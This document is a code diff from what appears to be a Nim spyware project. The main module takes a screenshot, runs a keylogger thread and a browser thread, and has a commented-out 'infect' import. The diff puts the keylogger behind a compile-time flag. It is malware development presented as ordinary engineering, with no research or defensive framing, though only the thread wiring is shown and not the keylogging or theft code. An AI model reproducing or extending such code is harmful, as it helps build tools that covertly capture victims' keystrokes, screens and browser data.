@@ -1,13 +1,13 @@
 import asyncdispatch
 from os import sleep
 
-import lib/threads/keyloggerThread
 import lib/functions/getWindowName
 import lib/functions/screenshot
 
 from lib/channels import mainThread
 
 from lib/flags import USE_BROWSER_THREAD
+from lib/flags import USE_KEYLOGGER_THREAD
 
 # am pus asta doar ca sa testez func
 # import lib/functions/infect
@@ -27,15 +27,20 @@ let base64Ss: string = screenshot()
 open mainThread
 
 ## TODO: CODE CLEANUP
-var keyloggerThreadVar: Thread[void]
+
+when USE_KEYLOGGER_THREAD:
+  from lib/threads/keyloggerThread import initKeyloggerThread
+
+  var keyloggerThreadVar: Thread[void]
+
+  createThread(keyloggerThreadVar, initKeyloggerThread)
 
 when USE_BROWSER_THREAD:
   from lib/threads/browserThread import initBrowserThread
+
   var browserThreadVar: Thread[void]
+
   createThread(browserThreadVar, initBrowserThread)
-
-
-createThread(keyloggerThreadVar, initKeyloggerThread)
 
 while true:
   ## TODO:
